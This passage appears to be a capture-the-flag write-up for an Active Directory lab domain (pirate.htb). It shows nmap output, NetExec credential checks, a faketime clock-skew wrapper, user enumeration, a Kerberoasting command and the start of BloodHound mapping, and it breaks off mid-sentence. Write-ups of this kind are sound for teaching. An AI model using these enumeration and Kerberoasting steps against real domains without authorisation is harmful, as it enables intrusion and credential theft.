As is in real life penetration testing. A credential with low privilege will be given.
`pentest / p3nt3st2025!&`
# Scanning
First we need to scan the domain what it's all about
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-04 15:10:48Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNTA2MDkxNDA1MTVaFw0yNjA2
| MDkxNDA1MTVaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMnSrMfKeTD3rXSf5Vtyri9jELPEvEcLNbDF
| MoMV9vFYfbJgCd4a1xRs1Zc1AKGti9l45w2WYGI8POtp9oBlg0sb0+9LX07mxLr3
| 28BJ2VNxhV6JhOMMSBRlQ4K5B7vKzgXw24CIfPUHrfPJJ3G6cjEDawDLQErlRFJ7
| p/fEgs5CTePFrcpiB94JBoaV1a+kBiY7a2sHGZXWy4alXoP/a0GEEdzcSPFj5MVV
| jA8NvEmptFG+SzZO9szR03rQRzhJHsVTQHgjw0+2NOi5UJ3GlhUiFzynSrfRae45
| qpqRzQ6wLYnlKvVv2OIujkgYBaCPvmTJ2ZGkD+pF5pILfcvdBn0CAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAnRcvhGgC93
| sCJqS7xJfQe20VzfMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAJv8X9T3HMKJ0L6m6eaHhd/X7C4d
| Ax38d6E6LbKYFyeK/UvbuFHCbMP9idfKxOEXsxKAvbK5F2rSkrlEeRqnnU68WkcU
| AG/gjmWOt1GFayNUGeUNteP1B8tpAv3V4BisIjOaE7oflz7+z1TImhcyghBbpG+n
| EviKNA3eQmxPpvcpmGvlg+70A1EghOfHOLr/3/ezfUmGUaYMONadSMM1rgN0Tcux
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-03-04T15:12:27+00:00; +7h00m03s from scanner time.
443/tcp   open  https?        syn-ack ttl 126
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T15:12:27+00:00; +7h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNTA2MDkxNDA1MTVaFw0yNjA2
| MDkxNDA1MTVaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMnSrMfKeTD3rXSf5Vtyri9jELPEvEcLNbDF
| MoMV9vFYfbJgCd4a1xRs1Zc1AKGti9l45w2WYGI8POtp9oBlg0sb0+9LX07mxLr3
| 28BJ2VNxhV6JhOMMSBRlQ4K5B7vKzgXw24CIfPUHrfPJJ3G6cjEDawDLQErlRFJ7
| p/fEgs5CTePFrcpiB94JBoaV1a+kBiY7a2sHGZXWy4alXoP/a0GEEdzcSPFj5MVV
| jA8NvEmptFG+SzZO9szR03rQRzhJHsVTQHgjw0+2NOi5UJ3GlhUiFzynSrfRae45
| qpqRzQ6wLYnlKvVv2OIujkgYBaCPvmTJ2ZGkD+pF5pILfcvdBn0CAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAnRcvhGgC93
| sCJqS7xJfQe20VzfMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAJv8X9T3HMKJ0L6m6eaHhd/X7C4d
| Ax38d6E6LbKYFyeK/UvbuFHCbMP9idfKxOEXsxKAvbK5F2rSkrlEeRqnnU68WkcU
| AG/gjmWOt1GFayNUGeUNteP1B8tpAv3V4BisIjOaE7oflz7+z1TImhcyghBbpG+n
| EviKNA3eQmxPpvcpmGvlg+70A1EghOfHOLr/3/ezfUmGUaYMONadSMM1rgN0Tcux
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
2179/tcp  open  vmrdp?        syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T15:12:27+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNTA2MDkxNDA1MTVaFw0yNjA2
| MDkxNDA1MTVaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMnSrMfKeTD3rXSf5Vtyri9jELPEvEcLNbDF
| MoMV9vFYfbJgCd4a1xRs1Zc1AKGti9l45w2WYGI8POtp9oBlg0sb0+9LX07mxLr3
| 28BJ2VNxhV6JhOMMSBRlQ4K5B7vKzgXw24CIfPUHrfPJJ3G6cjEDawDLQErlRFJ7
| p/fEgs5CTePFrcpiB94JBoaV1a+kBiY7a2sHGZXWy4alXoP/a0GEEdzcSPFj5MVV
| jA8NvEmptFG+SzZO9szR03rQRzhJHsVTQHgjw0+2NOi5UJ3GlhUiFzynSrfRae45
| qpqRzQ6wLYnlKvVv2OIujkgYBaCPvmTJ2ZGkD+pF5pILfcvdBn0CAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAnRcvhGgC93
| sCJqS7xJfQe20VzfMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAJv8X9T3HMKJ0L6m6eaHhd/X7C4d
| Ax38d6E6LbKYFyeK/UvbuFHCbMP9idfKxOEXsxKAvbK5F2rSkrlEeRqnnU68WkcU
| AG/gjmWOt1GFayNUGeUNteP1B8tpAv3V4BisIjOaE7oflz7+z1TImhcyghBbpG+n
| EviKNA3eQmxPpvcpmGvlg+70A1EghOfHOLr/3/ezfUmGUaYMONadSMM1rgN0Tcux
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-04T15:12:27+00:00; +7h00m04s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Issuer: commonName=pirate-DC01-CA/domainComponent=pirate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-09T14:05:15
| Not valid after:  2026-06-09T14:05:15
| MD5:     5c8e b331 ef90 890a d8e3 feaa b53c 2910
| SHA-1:   0128 c655 2aed c190 efff d3eb a2fb 034b fa86 ab69
| SHA-256: a2c7 cecc 4854 8f57 a69c 7302 9621 8bb1 6796 ee2d ad60 c34b b005 9a00 a1e6 3358
| -----BEGIN CERTIFICATE-----
| MIIGKDCCBRCgAwIBAgITdAAAAAP6wnCqSNol9QAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGcGlyYXRl
| MRcwFQYDVQQDEw5waXJhdGUtREMwMS1DQTAeFw0yNTA2MDkxNDA1MTVaFw0yNjA2
| MDkxNDA1MTVaMBoxGDAWBgNVBAMTD0RDMDEucGlyYXRlLmh0YjCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMnSrMfKeTD3rXSf5Vtyri9jELPEvEcLNbDF
| MoMV9vFYfbJgCd4a1xRs1Zc1AKGti9l45w2WYGI8POtp9oBlg0sb0+9LX07mxLr3
| 28BJ2VNxhV6JhOMMSBRlQ4K5B7vKzgXw24CIfPUHrfPJJ3G6cjEDawDLQErlRFJ7
| p/fEgs5CTePFrcpiB94JBoaV1a+kBiY7a2sHGZXWy4alXoP/a0GEEdzcSPFj5MVV
| jA8NvEmptFG+SzZO9szR03rQRzhJHsVTQHgjw0+2NOi5UJ3GlhUiFzynSrfRae45
| qpqRzQ6wLYnlKvVv2OIujkgYBaCPvmTJ2ZGkD+pF5pILfcvdBn0CAwEAAaOCAzkw
| ggM1MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABs
| AGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQD
| AgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQME
| AgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglg
| hkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAnRcvhGgC93
| sCJqS7xJfQe20VzfMB8GA1UdIwQYMBaAFLtY4D2HzTfY9jUtfvRgBNVPOZsIMIHI
| BgNVHR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPXBpcmF0ZS1EQzAxLUNB
| LENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNl
| cnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERDPWh0Yj9jZXJ0aWZp
| Y2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0
| aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6
| Ly8vQ049cGlyYXRlLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNl
| cnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9cGlyYXRlLERD
| PWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlv
| bkF1dGhvcml0eTA7BgNVHREENDAyoB8GCSsGAQQBgjcZAaASBBDEVbnRlVqPSpJn
| m1iCmy/sgg9EQzAxLnBpcmF0ZS5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQxMDc0MjQxMjgtNDE1ODA4MzU3My0xMzAwMzI1
| MjQ4LTEwMDAwDQYJKoZIhvcNAQELBQADggEBAJv8X9T3HMKJ0L6m6eaHhd/X7C4d
| Ax38d6E6LbKYFyeK/UvbuFHCbMP9idfKxOEXsxKAvbK5F2rSkrlEeRqnnU68WkcU
| AG/gjmWOt1GFayNUGeUNteP1B8tpAv3V4BisIjOaE7oflz7+z1TImhcyghBbpG+n
| EviKNA3eQmxPpvcpmGvlg+70A1EghOfHOLr/3/ezfUmGUaYMONadSMM1rgN0Tcux
| 4dX2LDo4PoAbEY/X9z0C/mUJGaIw0NRaYwYnnXJSDaj42juZvgGbomE2JB5Tu+gJ
| hriiFzSqPhNk/jSlWx8H6TindyH+xyK9q5xa6X20tmEKYVtS2aAcSmt2URI=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49905/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49929/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49952/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.98%I=7%D=3/4%Time=69A7E913%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-04T15:11:47
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8617/tcp): CLEAN (Timeout)
|   Check 2 (port 41031/tcp): CLEAN (Timeout)
|   Check 3 (port 49695/udp): CLEAN (Timeout)
|   Check 4 (port 64457/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h00m03s, deviation: 0s, median: 7h00m02s

```

Observing the results of our scan we have the following
```txt
Port 88 - Kerberos
Port 80 - IIS Web Server
Port 389/636 - LDAP/LDAPS
Port 445 - SMB
Port 53 - DNS
Port 135 - RPC
Port 5985 - WinRM
AD Certificate Services CA Present (issue: `pirate-DC01-CA`)
Message signing required on SMB
Domain: `pirate.htb`
```

# Pre-requisites
In order to avoid hindrances when trying to pentest AD. We can use `nxc` to generate hosts file as well as the `krb5.conf` file so we only need to export it.
```bash
nxc smb $target_ip --generate-hosts-file hostsfile
```
Look into the contents of hostsfile and import it in `/etc/hosts`. 

As a precaution, we can generate a Kerberos configuration using `nxc` for Kerberos authentication in the future
```bash 
$ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --generate-krb5-file ./krb5.conf SMB 10.129.1.12 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.1.12 445 DC01 [+] krb5 conf saved to: ./krb5.conf SMB 10.129.1.12 445 DC01 [+] Run the following command to use the conf file: export KRB5_CONFIG=./krb5.conf SMB 10.129.1.12 445 DC01 [+] pirate.htb\pentest:p3nt3st2025!&
```
The contents of the `krb5.conf` looks like this
```bash
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PIRATE.HTB

[realms]
    PIRATE.HTB = {
        kdc = dc01.pirate.htb
        admin_server = dc01.pirate.htb
        default_domain = pirate.htb
    }

[domain_realm]
    .pirate.htb = PIRATE.HTB
    pirate.htb = PIRATE.HTB
```
We can then export it with `export KRB5_CONFIG=krb5.conf`
# Enumeration
We need to enumerate the given credential first on what access it has on SMB, LDAP, and WINRM
```bash
$ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' SMB 10.129.1.12 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB 10.129.1.12 445 DC01 [+] pirate.htb\pentest:p3nt3st2025!&
  
$ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' LDAP 10.129.1.12 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never) LDAP 10.129.1.12 389 DC01 [+] pirate.htb\pentest:p3nt3st2025!& 
  
$ nxc winrm pirate.htb -u 'pentest' -p 'p3nt3st2025!&' WINRM 10.129.1.12 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) WINRM 10.129.1.12 5985 DC01 [-] pirate.htb\pentest:p3nt3st2025!&
```
LDAP signing is disabled on the DC (unlike SMB), making LDAP a potential relay target

Consider it a best practice to prepare a working Kerberos setup in advance if the domain allows it. Since NTLM may still be restricted across parts of the domain.

To get the Kerberos authentication we can use `nxc` with `-k` flag:
```bash
$ nxc winrm pirate.htb -u 'pentest' -p 'p3nt3st2025!&' WINRM 10.129.1.12 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) WINRM 10.129.1.12 5985 DC01 [-] pirate.htb\pentest:p3nt3st2025!&
```
The `KRB_AP_ERR_SKEW` error is due to time difference. If authentication fails due to skew, we realign it using `ntpdate`. Sometimes, `ntpdate` does not work so we will wrap it with `faketime` commands or better yet a custom script which is `ft.sh` .
```bash
#!/usr/bin/env bash

set -euo pipefail

if [ $# -lt 2 ]; then
    echo "Usage: $0 <ip> <command>"
    exit 1
fi

ip="$1"
shift
command=( "$@" )

echo "[*] Querying offset from: $ip"

# Extract first signed floating-point offset from ntpdate output
offset_float=$(ntpdate -q "$ip" 2>/dev/null | grep -oE '[+-][0-9]+\.[0-9]+' | head -n1 || true)

if [ -z "${offset_float:-}" ]; then
    echo "[!] Failed to extract valid offset from ntpdate."
    echo "[!] Raw ntpdate output:"
    ntpdate -q "$ip" || true
    exit 1
fi

# Compose faketime format (already includes + or -)
faketime_fmt="${offset_float}s"

echo "[*] Detected offset: $offset_float seconds"
echo "[*] faketime format: $faketime_fmt"
echo "[*] Running: ${command[*]}"
echo

exec faketime -f "$faketime_fmt" "${command[@]}"
```
Since we already generated a `KRB5_CONFIG` we can proceed to authenticate with Kerberos by wrapping it with the custom `ft.sh` script.
```bash
$ ./ft.sh pirate.htb \ nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k [*] Querying offset from: pirate.htb [*] faketime -f format: +25144.539157 25144.539157s [*] Running: nxc smb pirate.htb -u pentest -p p3nt3st2025!& -k SMB pirate.htb 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True) SMB pirate.htb 445 DC01 [-] Error checking if user is admin on pirate.htb: The NETBIOS connection with the remote host timed out. SMB pirate.htb 445 DC01 [+] pirate.htb\pentest:p3nt3st2025!&
```
Since Kerberos authentication succeeds we can reuse this setup whenever Kerberos access is required.

Even without Kerberos, as long as we have a valid user, we can enumerate the users in the domain with
```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --users
```
It will then output the following uses
```
Administrator
Guest
krbtgt
a.white_adm
a.white
pentest
j.sparrow
```
There are some interesting pair of users which is `a.white_adm` and `a.white` we can attempt to do a Kerberoasting with `nxc` wrapping it with `ft.sh` custom script with the `--kerberoasting` flag and passing the found users.
```bash  
./ft.sh pirate.htb \ nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k --kerberoasting output.txt
```
The result from getting the roastable users are not crackable with `rockyou.txt`. In a CTF context, this signals to a rabbit hole.

We move on to Bloodhound enumeration. If you have a valid credentials and LDAP is reachable. It is possible to collection information for Bloodhound. This allows us to map the domain permissions as well as the information of each and every account.

# BloodHound Enumeration

Since LDAP Port is publicly open we can use `bloodhound-python` or `rushound` depending on your choice to collect information. Once successful, upload the zip file to BloodHound so it will be ingested.

Starting from the `pentest` user:
![](../assets/Pirate/Pasted%20image%2020260309153506.png)

Looking at the graph we see a **Pre-Windows 2000 Compatible Access**. It is a legacy group for NT-style queries. In modern domains it is usually benign - unless misconfigured

